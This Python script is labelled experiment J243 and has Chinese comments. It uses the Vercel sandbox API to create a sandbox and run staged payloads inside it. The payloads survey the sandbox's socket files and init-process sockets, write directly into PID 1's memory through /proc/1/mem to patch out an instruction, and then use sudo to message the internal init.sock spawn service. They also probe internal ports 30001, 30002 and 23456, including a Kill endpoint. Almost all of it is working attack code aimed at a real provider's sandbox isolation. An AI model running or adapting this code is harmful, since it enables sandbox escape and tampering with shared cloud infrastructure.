# 实验J243: patch后init.sock测试 + 30002/23456深测(多行代码) + 文件系统socket侦察
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj243"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A) 文件系统 socket 侦察 + PID1 fd socket inode 归属
CODE_A = r'''
import subprocess, os
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
# 沙箱内 socket 文件
r = subprocess.run("find /run /tmp /var/run -type s 2>/dev/null | head -20; echo ---; ls -la /run/vercel/share/ 2>&1", shell=True, capture_output=True, text=True, timeout=10)
p("SOCKFILES", (r.stdout + r.stderr)[:800].replace(chr(10), "|"))
# PID1 fd socket inode -> tcp 还是 unix?
for ino in ("1259", "1265", "1290"):
    r = subprocess.run("grep " + ino + " /proc/1/net/tcp6 /proc/1/net/tcp 2>/dev/null | head -3; grep -E '^ *[0-9]+: +[0-9A-F]+: +" + ino + " ' /proc/1/net/unix 2>/dev/null | head -3", shell=True, capture_output=True, text=True, timeout=10)
    p("INO_" + ino, (r.stdout + r.stderr)[:400].replace(chr(10), "|"))
# 全 unix 表 (带 refcount 排序)
r = subprocess.run("cat /proc/1/net/unix | head -40", shell=True, capture_output=True, text=True, timeout=10)
p("UNIX_ALL", (r.stdout + r.stderr)[:2000].replace(chr(10), "|"))
p("DONE_A", flush=True)
'''
run_cmd(sid, CODE_A, "A_RECON", timeout=100)

# B) patch (标准方法)
CODE_B = r'''
import os
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
def wa(a, b):
    os.lseek(fd, a, 0)
    return os.write(fd, b)
old = ra(0x83afe0, 5)
print("OLD", old.hex(), flush=True)
if old == bytes.fromhex("e8bb030000"):
    n = wa(0x83afe0, bytes.fromhex("31c0909090"))
    print("WROTE", n, flush=True)
print("NEW", ra(0x83afe0, 5).hex(), flush=True)
print("DONE_B", flush=True)
'''
run_cmd(sid, CODE_B, "B_PATCH", timeout=100)

# C) patch 后 sudo 连 init.sock 发 Ping (关键!)
CODE_C = r'''
import subprocess
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
code = (
    "import socket, time\n"
    "s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n"
    "s.settimeout(4)\n"
    "s.connect('/run/vercel/share/init.sock')\n"
    "print('C_OK', flush=True)\n"
    "req = (b'POST /vercel.sandbox.spawn.v1.SpawnService/Ping HTTP/1.1\\r\\n'\n"
    "       b'Host: x\\r\\nContent-Type: application/json\\r\\n'\n"
    "       b'Connect-Protocol-Version: 1\\r\\nContent-Length: 2\\r\\n\\r\\n{}')\n"
    "s.send(req)\n"
    "print('SENT', flush=True)\n"
    "d = b''\n"
    "while True:\n"
    "    try:\n"
    "        b = s.recv(4096)\n"
    "        if not b:\n"
    "            break\n"
    "        d += b\n"
    "    except Exception as e:\n"
    "        print('RE', type(e).__name__, flush=True)\n"
    "        break\n"
    "print('RESP', d[:400].decode(errors='replace'), flush=True)\n"
    "print('DONE', flush=True)\n"
)
for who, cmd in (("USER", ["python3", "-c", code]), ("ROOT", ["sudo", "-n", "python3", "-c", code])):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        p("INIT", who, "rc", r.returncode, "OUT", (r.stdout + r.stderr)[:400].replace(chr(10), "|"))
    except Exception as e:
        p("INIT", who, "EXC", type(e).__name__, str(e)[:80])
p("DONE_C", flush=True)
'''
run_cmd(sid, CODE_C, "C_INIT_PATCHED", timeout=100)

# D) 30002 深测 (多行代码)
CODE_D = r'''
import socket
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
def t30002(payload, label, send=True):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(('127.0.0.1', 30002))
        p("30002", label, "C_OK")
        if send:
            s.send(payload)
            p("30002", label, "SENT", len(payload))
        d = b''
        while True:
            try:
                b = s.recv(4096)
                if not b:
                    break
                d += b
            except socket.timeout:
                p("30002", label, "TIMEOUT", "got", len(d))
                break
            except Exception as e:
                p("30002", label, "RE", type(e).__name__)
                break
        if d:
            p("30002", label, "RESP", d[:200].hex())
        s.close()
    except Exception as e:
        p("30002", label, "EXC", type(e).__name__, str(e)[:80])
t30002(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n", "GET")
t30002(b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 2\r\n\r\n{}", "POST")
t30002(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", "H2")
t30002(b"", "NODATA", send=False)
p("DONE_D", flush=True)
'''
run_cmd(sid, CODE_D, "D_30002", timeout=100)

# E) 23456 深测
CODE_E = r'''
import socket
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
def t23456(payload, label, send=True):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(('127.0.0.1', 23456))
        p("23456", label, "C_OK")
        if send:
            s.send(payload)
            p("23456", label, "SENT", len(payload))
        d = b''
        while True:
            try:
                b = s.recv(4096)
                if not b:
                    break
                d += b
            except socket.timeout:
                p("23456", label, "TIMEOUT", "got", len(d))
                break
            except Exception as e:
                p("23456", label, "RE", type(e).__name__)
                break
        if d:
            p("23456", label, "RESP", d[:200].hex())
        s.close()
    except Exception as e:
        p("23456", label, "EXC", type(e).__name__, str(e)[:80])
t23456(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n", "GET")
t23456(b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 2\r\n\r\n{}", "POST")
t23456(b"", "NODATA", send=False)
p("DONE_E", flush=True)
'''
run_cmd(sid, CODE_E, "E_23456", timeout=100)

# F) 30001 全面矩阵 (无patch对照)
CODE_F = r'''
import urllib.request, urllib.error
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
for path in ("/", "/x", "/vercel.sandbox.spawn.v1.SpawnService/Ping", "/vercel.sandbox.spawn.v1.SpawnService/Kill"):
    for hdr in (None, "1"):
        try:
            req = urllib.request.Request("http://127.0.0.1:30001" + path, data=b"{}", method="POST")
            req.add_header("Content-Type", "application/json")
            if hdr:
                req.add_header("Connect-Protocol-Version", hdr)
            r = urllib.request.urlopen(req, timeout=4)
            p("M", path, hdr, r.status, r.read()[:80])
        except urllib.error.HTTPError as e:
            p("M", path, hdr, e.code, e.read()[:80])
        except Exception as e:
            p("M", path, hdr, "EXC", type(e).__name__, str(e)[:60])
p("ALIVE", "ok")
p("DONE_F", flush=True)
'''
run_cmd(sid, CODE_F, "F_30001", timeout=100)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
